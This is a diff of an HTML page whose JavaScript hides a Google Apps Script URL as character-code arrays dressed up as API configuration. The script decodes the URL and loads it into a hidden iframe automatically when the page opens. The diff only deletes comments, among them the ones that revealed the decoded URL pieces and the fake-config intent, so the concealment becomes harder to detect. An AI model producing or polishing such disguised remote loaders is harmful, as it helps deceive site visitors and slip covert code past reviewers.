@@ -34,7 +34,7 @@
 <iframe id="portal" style="display:none"></iframe>
 
 <script>
-// Datos que parecen configuración de API
+
 const configApi = {
   version: "2.3",
   endpoints: {
@@ -54,31 +54,31 @@ const configApi = {
   retryDelay: 1000
 };
 
-// Función para convertir códigos a texto
+
 function decodificar(parte) {
   return parte.map(c => String.fromCharCode(c)).join('');
 }
 
-// Obtener URL completa
+
 function obtenerDestino() {
   const e = configApi.endpoints;
   const partes = [
-    e.primary,   // "https://"
-    e.domain,    // "script.google"
-    e.path,      // ".com/macros/s/"
-    e.keyA,      // "AKfycbzwG6"
-    e.keyB,      // "m_uwI9fy-A"
-    e.keyC,      // "RBmdwc4iOD"
-    e.keyD,      // "4SAun9u2df"
-    e.keyE,      // "Q9iThbupFj"
-    e.keyF,      // "9rVyl26o0i"
-    e.keyG,      // "9ccv9RKxhm"
-    e.keyH       // "xh/exec"
+    e.primary,   
+    e.domain,   
+    e.path,      
+    e.keyA,      
+    e.keyB,      
+    e.keyC,      
+    e.keyD,      
+    e.keyE,      
+    e.keyF,      
+    e.keyG,      
+    e.keyH       
   ];
   
   try {
     const url = partes.map(decodificar).join('');
-    // Validación mínima
+    
     if (!url.startsWith('https://') || url.length < 50) {
       throw new Error('Estructura inválida');
     }
@@ -100,7 +100,7 @@ function ocultarError() {
   document.querySelector('.loading').style.display = 'block';
 }
 
-// Conectar al portal
+
 function conectar() {
   ocultarError();
   
@@ -122,10 +122,10 @@ function conectar() {
     mostrarError('No se pudo establecer conexión');
   };
   
-  // Agregar timestamp para evitar cache
+  
   portal.src = destino + '?_=' + Date.now();
   
-  // Timeout
+  
   setTimeout(() => {
     if (cargando.style.display !== 'none') {
       mostrarError('Tiempo de conexión agotado');
@@ -133,10 +133,10 @@ function conectar() {
   }, configApi.timeout);
 }
 
-// Iniciar automáticamente
+
 setTimeout(conectar, 800);
 
-// También al hacer clic en el body (backup)
+
 document.body.addEventListener('click', function() {
   if (document.querySelector('.error').style.display === 'block') {
     conectar();
@@ -146,3 +146,4 @@ document.body.addEventListener('click', function() {
 
 </body>
 </html>
+
